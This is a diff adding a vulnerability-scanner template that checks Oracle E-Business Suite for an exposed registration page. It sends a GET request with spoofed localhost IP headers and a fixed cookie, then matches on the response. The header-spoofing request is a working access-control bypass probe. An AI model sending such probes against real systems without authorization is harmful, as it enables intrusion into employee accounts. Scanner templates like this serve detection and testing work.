@@ -1,0 +1,33 @@
+id: Oracle_E-Business_Login
+
+info:
+  name: Oracle E-Business Login
+  author: momika233(https://twitter.com/momika233)
+  severity: high
+  reference:
+    - hhttps://orwaatyat.medium.com/my-new-discovery-in-oracle-e-business-login-panel-that-allowed-to-access-for-all-employees-ed0ec4cad7ac
+  tags: Oracle
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OA_HTML/ibeCAcpSSOReg.jsp"
+
+    headers:
+      X-Client-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Remote-Addr: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      Cookie: BFC1P=NweKM7SXxXeGV6reCLqes4XxcY
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "jtftmplh.*"
